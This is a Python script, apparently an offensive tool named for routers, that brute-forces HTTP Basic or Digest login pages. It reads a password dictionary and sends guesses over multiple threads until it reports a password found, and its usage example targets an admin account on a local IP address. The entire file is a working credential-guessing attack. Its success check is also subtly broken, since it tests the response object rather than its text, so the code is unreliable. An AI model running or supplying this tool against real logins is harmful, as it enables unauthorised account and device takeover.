 

#!/usr/bin/python3

from threading import Thread
import sys
import requests 
import getopt
from requests.auth import HTTPDigestAuth
global hit
hit="1"
def Banner():
    print('''              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
              $     BASE OF DIGEST BRUTEFORCE AUTH       $
              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ ''')

def usage():
    print(" Usage :")
    print("         -w : url (http://192.168.43.24/login.php)")
    print("         -u : username")
    print("         -t : Threads")
    print("         -f : dictionary file")
    print("         -m : method (basic or digest)")
    print("For example : router.py -w http://192.268.43.24/login.php -u admin -f p.txt -m basic -t 5 ")

class request_performer(Thread):
    def __init__(self,passwd,user,url,method):
        Thread.__init__(self)
        self.password=passwd.split("\n")[0]
        self.username=user
        self.url=url
        self.method=method
        print("* " + self.password+" * ")
    def run(self):
        global i
        global hit
        if hit=="1":
            try:
                if self.method=="basic":
                    r=requests.get(self.url,auth=(self.username,self.password))
                elif self.method=="digest":
                    r=requests.get(self.url,auth=HTTPDigestAuth(self.username,self.password))
                print(r.url)
                r1=str(r.content)
                r1=r1.split("\\n")
                for i1 in r1:
                   print(i1)       
                if not ("Username and Password do not match." in r):
                    hit ="0"
                    print("[+] Password Found "+self.password)
                    sys.exit()
                else:
                    print("[-]Not Valid Password "+self.password)
                    print(type(i[0]))
                    print(i)
                    i[0]=i[0]-1
            except Exception as e:
                print(e)


def start(argv):
    Banner()
    if len(sys.argv)< 11:
        usage()
        sys.exit()
    try:
        opts,args=getopt.getopt(argv,"w:u:f:m:t:")
    except getopt.GetoptError:
        print("[-] Error  on Arguements ")
        sys.exit()
    for opt,arg in opts:
        if opt=='-u':
            user=arg
        elif opt=='-w':
            url=arg
        elif opt=='-f':
            dic=arg
        elif opt=='-m':
            method=arg
        elif opt=='-t':
            threads=int(arg)
    try:
        f=open(dic,"r")
        passwords = f.readlines()
    except:
        print("[-] File does not exists Check the path")
        sys.exit()
    launcher_threads(passwords,threads,user,url,method)

def launcher_threads(passwords,threads,user,url,method):
    global i
    i=[]
    i.append(0)
    while len(passwords):
        if(hit=="1"):
            try:
                if(i[0]<threads):
                    passwrd=passwords.pop(0)
                    i[0]=i[0]+1
                    th=request_performer(passwrd,user,url,method)
                    th.start()
            except KeyboardInterrupt:
                print("[-] Interrupted")
                sys.exit()
            th.join()
        else:
            sys.exit()
if __name__=='__main__':
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("KEYBOARD INTERRUPT")
        sys.exit()
